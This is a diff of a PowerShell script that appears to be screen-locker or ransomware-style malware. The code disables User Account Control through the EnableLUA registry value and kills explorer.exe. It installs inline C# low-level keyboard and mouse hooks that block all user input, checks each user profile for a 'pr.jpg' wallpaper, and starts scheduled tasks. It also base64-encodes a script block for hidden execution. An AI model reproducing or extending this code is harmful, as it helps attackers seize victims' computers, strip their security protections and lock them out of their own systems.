@@ -1,30 +1,16 @@
 $scriptBlock10={
     New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
    
-    $scriptBlock20=@'
+  #  $scriptBlock20=@'
         #god do
         #check for background and stuff
         # user do
         $scriptBlock1={
 
             #execute to user
-            
-            #Add-Type -TypeDefinition "using System;using System.Runtime.InteropServices;public class H{static IntPtr h,m;static L k,l;delegate IntPtr L(int n,IntPtr w,IntPtr p);public static void S(){k=K;l=K;h=SetWindowsHookEx(14,k,IntPtr.Zero,0);m=SetWindowsHookEx(13,l,IntPtr.Zero,0);}public static void U(){UnhookWindowsHookEx(h);UnhookWindowsHookEx(m);}static IntPtr K(int n,IntPtr w,IntPtr p){return (IntPtr)1;}[DllImport(`"user32.dll`")]static extern IntPtr SetWindowsHookEx(int i,L d,IntPtr m,uint t);[DllImport(`"user32.dll`")]static extern bool UnhookWindowsHookEx(IntPtr h);}";[H]::S();
             Stop-Process -f -ProcessName explorer
             #execute stuff for the background
             Add-Type -TypeDefinition "using System;using System.Runtime.InteropServices;public class H{static IntPtr h,m;static L k,l;delegate IntPtr L(int n,IntPtr w,IntPtr p);public static void S(){k=K;l=K;h=SetWindowsHookEx(14,k,IntPtr.Zero,0);m=SetWindowsHookEx(13,l,IntPtr.Zero,0);}public static void U(){UnhookWindowsHookEx(h);UnhookWindowsHookEx(m);}static IntPtr K(int n,IntPtr w,IntPtr p){return (IntPtr)1;}[DllImport(`"user32.dll`")]static extern IntPtr SetWindowsHookEx(int i,L d,IntPtr m,uint t);[DllImport(`"user32.dll`")]static extern bool UnhookWindowsHookEx(IntPtr h);}";[H]::S();
-            
-            $sidKeys = Get-ChildItem -Path "Registry::HKEY_USERS"  |Where-Object { $_.Name -match "S-1-5-21" -and $_.Name -notlike "*_Classes"} | Select-Object -Property Name
-            # Loop through each SID and perform an action (for example, display the SID name)
-            foreach ($sid in $sidKeys) {
-
-                Write-Host "Processing SID: $($sid.Name)"
-                $ID=$sid.Name
-                $wall=(Get-ItemProperty -Path "Registry::$ID\Control Panel\Desktop").Wallpaper
-                if(-not($wall -match "pr.jpg")){
-
-                    Write-Output "not effective"
-            Stop-Process -f -ProcessName explorer
             #execute stuff for the background
             $sidKeys = Get-ChildItem -Path "Registry::HKEY_USERS"  |Where-Object { $_.Name -match "S-1-5-21" -and $_.Name -notlike "*_Classes"} | Select-Object -Property Name
             # Loop through each SID and perform an action (for example, display the SID name)
@@ -99,7 +85,7 @@ $scriptBlock10={
                 Start-ScheduledTask -TaskName "FileSystem $modifiedString"
             }
         }
-'@
+#'@
 
     #creation of god
     $encodedCommand20=$encodedCommand20 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptBlock20.ToString()))
